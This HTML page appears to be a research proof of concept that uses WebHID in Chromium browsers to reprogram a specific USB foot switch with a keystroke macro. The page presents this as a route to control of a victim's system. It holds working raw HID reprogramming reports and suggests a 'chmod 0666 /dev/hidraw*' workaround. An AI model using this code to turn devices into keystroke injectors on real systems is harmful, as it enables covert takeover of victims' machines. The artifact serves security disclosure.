<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <style>
      /* Button Style Source: https://copy-paste-css.com/ */
      button {
        display: inline-block;
        outline: 0;
        cursor: pointer;
        border-radius: 6px;
        border: 2px solid #ff4742;
        color: #fff;
        background-color: #ff4742;
        padding: 8px;
        box-shadow: rgba(0, 0, 0, 0.07) 0px 2px 4px 0px,
          rgba(0, 0, 0, 0.05) 0px 1px 1.5px 0px;
        font-weight: 800;
        font-size: 16px;
        height: 42px;
      }
      button:hover {
        background: 0 0;
        color: #ff4742;
      }
    </style>
    <script src="parsehid.js"></script>
    <title>WebHID USB Foot Switch PoC</title>
  </head>
  <body
    style="
      width: 100vw;
      font-family: monospace;
      display: flex;
      justify-content: center;
      margin: 0;
      padding: 0;
      overflow-x: hidden;
    "
  >
    <div
      style="
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        width: 50%;
      "
    >
      <h1 style="text-align: center">WebHID USB Foot Switch PoC</h1>
      <p style="text-align: justify">
        This Proof-of-Concept demonstrates how reprogrammable
        <i>Human Interface Devices (HIDs)</i> may be leveraged by a malicious
        actor to gain control over a victim's system using WebHID. The API is
        only available in <b>Chromium-based browsers</b> (e.g., Google Chrome or
        Microsoft Edge). This PoC uses the
        <a href="https://aliexpress.com/item/32972011831.html"
          >USB Foot Switch</a
        >, a widely available switch that costs about 10$ or less.
      </p>
      <p style="text-align: justify">
        Please open the <b>developer console</b> for more information. The PoC
        will start immediately upon button press and require you to select the
        device in the permission dialog.
      </p>
      <textarea style="width: 100%" rows="20" id="keys"></textarea>
      <span id="err" style="color: red; text-align: center; font-size: 1.5rem; margin: 1rem"></span>
      <button style="margin: 1rem" onclick="poc()">Program!</button>
      <p style="text-align: justify">
        More extensive tooling can be found in
        <a href="https://anonymous.4open.science/r/hid-and-run-A257/"
          >this anonymous repository</a
        >. Since the anonymous repository does not provide bulk downloads we
        have also attached a ZIP file of the repository.
        <b
          >Our findings are described in detail in the paper attached as a
          PDF.</b
        >
      </p>
    </div>
  </body>
  <script>
    async function poc() {
      let keys = parseScript();
      let device = await poc_open();
      if (!device) {
        console.error("Device not found!");
        return;
      }
      await poc_reprogram(device);
      return;
    }

    /* Get WebHID access to device. */
    async function poc_open() {
      console.log("Requesting permission to access device.");
      let devices = await navigator.hid.requestDevice({
        filters: [{ vendorId: 13651, productId: 45057 }],
      });
      if (!devices || !devices.length) return null;

      // find endpoint that allows configuration
      let device = null;
      for (let tmp_device of devices)
        if (tmp_device.collections.length === 1) {
          device = tmp_device;
          break;
        }
      if (!device) return null;

      console.log(`Opening device with the name "${device.productName}".`);
      try {
        await device.open();
      } catch (error) {
        console.error(
          "Device could not be opened. On Linux systems this step requires Chromium to be run as sudo or udev rules that allow writing to the device. As a workaround you may also use this command which gives write permission to HID devices on your Linux system: `sudo chmod 0666 /dev/hidraw*`."
        );
        return null;
      }

      return device;
    }

    function sleep(ms) {
      return new Promise((resolve) => setTimeout(resolve, ms));
    }

    function parseScript() {
      document.getElementById("err").innerHTML = "";
      var parsed = HIDSequenceParser.parse(
        document.getElementById("keys").value
      );
      if (parsed.errors.length != 0) {
        for (let e of parsed.errors) {
          document.getElementById("err").innerHTML +=
            "Error parsing line #" +
            e.line +
            ": Unknown token" +
            (e.tokens.length == 1 ? "" : "s") +
            " " +
            e.tokens.join(", ") +
            "<br/>";
        }
      }
      return parsed.keys;
    }

    async function poc_reprogram(device) {
      let start_time = performance.now();
      console.log("Starting reprogramming.");
      // init macro programming
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc0, 0x00,
        0x57, // length
        0x04, // macro id
        0x00, 0x00, 0x00 ])); await sleep(100);
      // macro name
      await device.sendReport(0, new Uint8Array([ 0x54, 0x65, 0x73, 0x74, 0x34, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      // name end
      // macro start
      await device.sendReport(0, new Uint8Array([ 0x00,
        0x57, // length
        0x01, 0x07, 0x01, 0x00, 0x04, 0x01 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x32, 0x07, 0x01, 0x00, 0x04, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x32, 0x07, 0x01, 0x00, 0x05, 0x01, 0x00, 0x32 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x07, 0x01, 0x00, 0x05, 0x00, 0x00, 0x32, 0x07 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0x00, 0x06, 0x01, 0x00, 0x32, 0x07, 0x01 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x06, 0x00, 0x00, 0x32, 0x07, 0x01, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x07, 0x01, 0x00, 0x32, 0x07, 0x01, 0x00, 0x07 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x00, 0x32, 0x07, 0x01, 0x02, 0x00, 0x01 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x32, 0x07, 0x01, 0x00, 0x19, 0x01, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x32, 0x07, 0x01, 0x00, 0x19, 0x00, 0x00, 0x32 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x07, 0x01, 0x02, 0x00, 0x00, 0x00, 0x32, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      // macro end
      // some epilogue
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc1, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc1, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc1, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc1, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc1, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0xc1, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      // epilogue end
      // activate macro
      await device.sendReport(0, new Uint8Array([ 0x01, 0x81, 0x08, 0x02, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x08, 0x0a,
        0x04, // macro id
        0x00, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      await device.sendReport(0, new Uint8Array([ 0x01, 0x82, 0x08, 0x02, 0x00, 0x00, 0x00, 0x00 ])); await sleep(100);
      console.log("Done!");
    }
  </script>
</html>
